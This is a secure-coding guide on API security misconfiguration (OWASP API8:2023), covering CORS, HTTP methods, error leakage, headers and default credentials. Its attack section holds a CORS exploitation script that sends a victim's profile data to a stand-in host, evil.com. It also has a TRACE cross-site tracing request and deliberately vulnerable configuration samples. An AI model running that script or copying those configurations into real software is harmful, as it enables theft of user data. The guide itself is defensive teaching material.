# API8:2023 — Security Misconfiguration

> **30-second summary:** APIs running with default configurations, overly permissive CORS, verbose error messages, unnecessary HTTP methods enabled, or missing security headers. Security misconfiguration is the most widespread API vulnerability — it takes minutes to exploit and seconds to prevent.

## Severity

**High** — Frequently exploited, easy to discover with automated scanners. Often the first step in a broader attack chain.

## Real-World Breach: Peloton (2021)

Peloton's API returned full user profile data (age, weight, location, workout history) with no authentication required — their API server was misconfigured to allow unauthenticated access to endpoints that should have required a session. Over 3 million accounts were exposed. The misconfiguration had been reported months earlier and not fixed.

## How It Happens

### 1. Overly Permissive CORS

```javascript
// VULNERABLE — wildcard CORS in production
app.use(cors({
  origin: '*',  // any site can make credentialed requests
  credentials: true
}));

// The attacker's site can now make authenticated API calls on behalf of users
```

### 2. Unnecessary HTTP Methods

```bash
# Testing which methods are allowed
curl -X OPTIONS https://api.example.com/users -i

# Response:
# Allow: GET, POST, PUT, DELETE, PATCH, OPTIONS, TRACE, CONNECT
#
# TRACE is dangerous — enables Cross-Site Tracing (XST) attacks
# CONNECT enables proxy abuse
```

### 3. Verbose Error Messages

```json
// VULNERABLE — stack trace in production error response
{
  "error": "Internal Server Error",
  "message": "relation \"users\" does not exist",
  "stack": "PostgreSQLError: relation \"users\" does not exist\n    at /app/node_modules/pg/lib/utils.js:93\n    at processTicksAndRejections (node:internal/process/task_queues:95)\nQuery: SELECT * FROM users WHERE email = 'admin@test.com'",
  "query": "SELECT * FROM users WHERE email = 'admin@test.com'"
}
```

The stack trace reveals:
- Database table names
- File paths on the server
- The ORM/database library version
- The actual SQL query

### 4. Default or Missing Security Headers

```bash
# Missing in production
HTTP/2 200
content-type: application/json
# Missing: X-Content-Type-Options, X-Frame-Options, HSTS, CSP
```

### 5. Unnecessary Features Enabled

```yaml
# Express in production with debug enabled
NODE_ENV=development  # left set in production .env
DEBUG=*               # logs everything to console
```

### 6. Default Credentials

```yaml
# Docker Compose with default database credentials
services:
  postgres:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: postgres  # default credential, never changed
      POSTGRES_USER: postgres
```

## Attack Patterns

### CORS Exploitation

```html
<!-- Attacker's site: evil.com -->
<script>
fetch('https://api.yourapp.com/users/me', {
  credentials: 'include'  // sends victim's session cookie
})
.then(r => r.json())
.then(data => {
  // Exfiltrate user's data to attacker's server
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

This works only if CORS is misconfigured with `origin: '*'` and `credentials: true`, OR if the `Access-Control-Allow-Origin` reflects the requesting origin without validation.

### TRACE Method XST

```bash
# Cross-Site Tracing: TRACE echoes request headers back
curl -X TRACE https://api.example.com/ \
  -H "Cookie: session=abc123"

# Response includes the Cookie header — extractable via XSS
```

## Fixes

### 1. Restrict CORS to Specific Origins

```javascript
// src/middleware/cors.ts
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://www.example.com',
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : []),
]);

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (server-to-server, curl during dev)
    if (!origin) return callback(null, true);
    
    if (ALLOWED_ORIGINS.has(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`Origin ${origin} not allowed by CORS policy`));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  maxAge: 86400, // Cache preflight for 24 hours
}));
```

### 2. Disable Dangerous HTTP Methods

```javascript
// Middleware to block unused HTTP methods
app.use((req, res, next) => {
  const dangerousMethods = ['TRACE', 'TRACK', 'CONNECT'];
  
  if (dangerousMethods.includes(req.method)) {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  next();
});

// Or at the Nginx level
limit_except GET POST PUT PATCH DELETE OPTIONS {
  deny all;
}
```

### 3. Sanitise Error Responses

```typescript
// src/middleware/error-handler.ts
import { Request, Response, NextFunction } from 'express';

interface AppError extends Error {
  statusCode?: number;
  isOperational?: boolean;
}

export function errorHandler(
  err: AppError,
  req: Request,
  res: Response,
  _next: NextFunction
) {
  const statusCode = err.statusCode ?? 500;
  const isProduction = process.env.NODE_ENV === 'production';
  
  // Always log full error internally
  console.error({
    error: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    requestId: req.headers['x-request-id'],
  });
  
  // Return sanitised error to client
  res.status(statusCode).json({
    error: isProduction
      ? getPublicMessage(statusCode) // Generic message in production
      : err.message,                  // Detailed message in development
    requestId: req.headers['x-request-id'], // For support lookup
  });
}

function getPublicMessage(statusCode: number): string {
  const messages: Record<number, string> = {
    400: 'Invalid request',
    401: 'Authentication required',
    403: 'Access denied',
    404: 'Resource not found',
    422: 'Validation failed',
    429: 'Too many requests',
    500: 'An unexpected error occurred',
  };
  return messages[statusCode] ?? 'An error occurred';
}
```

### 4. Add Security Headers

```javascript
// Using Helmet.js
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'none'"],
      // APIs typically return JSON — no script/style sources needed
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
  noSniff: true,
  frameguard: { action: 'deny' },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

// Remove server identification headers
app.disable('x-powered-by');
```

For Next.js API routes (`next.config.js`):
```javascript
const securityHeaders = [
  { key: 'X-DNS-Prefetch-Control', value: 'on' },
  { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
];

module.exports = {
  async headers() {
    return [
      {
        source: '/api/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

### 5. Environment-Specific Configuration

```typescript
// config/security.ts
export const securityConfig = {
  cors: {
    allowedOrigins: process.env.ALLOWED_ORIGINS?.split(',') ?? [],
  },
  errorMessages: {
    verbose: process.env.NODE_ENV !== 'production',
  },
  swagger: {
    // Never expose Swagger UI in production
    enabled: process.env.NODE_ENV !== 'production',
  },
  debugRoutes: {
    // /health/detailed, /__routes, /metrics etc.
    enabled: process.env.NODE_ENV !== 'production',
  },
};
```

### 6. Disable Documentation Endpoints in Production

```javascript
// Only mount API docs in non-production environments
if (process.env.NODE_ENV !== 'production') {
  const swaggerUi = await import('swagger-ui-express');
  const swaggerDocument = await import('./swagger.json');
  app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerDocument));
}

// If you must expose docs in production, require authentication:
app.use('/api-docs', requireInternalAuth, swaggerUi.serve, swaggerUi.setup(swaggerDocument));
```

## Security Checklist

```bash
# 1. Test CORS
curl -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -X OPTIONS https://api.example.com/ -v

# Should NOT return: Access-Control-Allow-Origin: https://evil.com

# 2. Test HTTP methods
curl -X TRACE https://api.example.com/ -i
# Should return: 405 Method Not Allowed

# 3. Check security headers
curl -I https://api.example.com/health
# Should include: X-Content-Type-Options, HSTS, X-Frame-Options

# 4. Trigger an error and check response
curl https://api.example.com/users/not-found-xyz
# Should NOT expose stack traces or internal paths

# 5. Check server header
curl -I https://api.example.com/ | grep -i server
# Should NOT reveal: Server: Express, nginx/1.18.0, etc.
```

## Testing

```typescript
describe('API Security Misconfiguration', () => {
  it('rejects cross-origin requests from unknown origins', async () => {
    const response = await request(app)
      .get('/api/users')
      .set('Origin', 'https://evil.com');
    
    expect(response.headers['access-control-allow-origin']).not.toBe('https://evil.com');
    expect(response.headers['access-control-allow-origin']).not.toBe('*');
  });

  it('returns 405 for TRACE method', async () => {
    const response = await request(app).trace('/api/users');
    expect(response.status).toBe(405);
  });

  it('does not expose stack traces in production errors', async () => {
    process.env.NODE_ENV = 'production';
    const response = await request(app).get('/api/trigger-error');
    
    expect(response.body.stack).toBeUndefined();
    expect(response.body.query).toBeUndefined();
    expect(response.body.error).not.toContain('node_modules');
  });

  it('includes required security headers', async () => {
    const response = await request(app).get('/api/health');
    
    expect(response.headers['x-content-type-options']).toBe('nosniff');
    expect(response.headers['strict-transport-security']).toBeDefined();
    expect(response.headers['x-powered-by']).toBeUndefined();
  });
});
```

## Automated Scanning

```bash
# OWASP ZAP baseline scan checks for misconfigurations
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://api.example.com \
  -r misconfiguration-report.html

# Mozilla Observatory — checks headers
curl -s "https://http.observatory.mozilla.org/api/v1/analyze?host=api.example.com" | jq '.grade'

# SecurityHeaders.com (manual check)
# https://securityheaders.com/?q=api.example.com
```

## Learn More

- [API Top 10 README](./README.md)
- [API9: Improper Inventory Management](./API9-improper-inventory-management.md)
- [Deployment Security: HTTPS & Headers](../../09-deployment-security/https-headers-checklist.md)
- [OWASP Configuration Guide](https://owasp.org/www-project-secure-headers/)
